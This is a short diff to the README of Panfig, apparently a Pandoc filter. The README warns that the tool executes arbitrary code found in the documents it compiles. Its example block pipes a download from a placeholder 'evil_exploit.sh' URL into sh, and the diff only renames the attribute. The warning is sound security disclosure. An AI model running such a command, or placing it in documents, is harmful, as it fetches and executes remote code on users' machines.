@@ -40,7 +40,7 @@ I am putting this here because you should care.
 **Panfig executes arbitrary code contained in the document being compiled. If you invoked Pandoc (+Panfig) on the following document, it would own your computer.**
 
 
-    ~~~~~~~~ { .panfig sh="curl http://example.com/evil_exploit.sh | sh"}
+    ~~~~~~~~ { .panfig shell="curl http://example.com/evil_exploit.sh | sh"}
     ~~~~~~~~
 
 
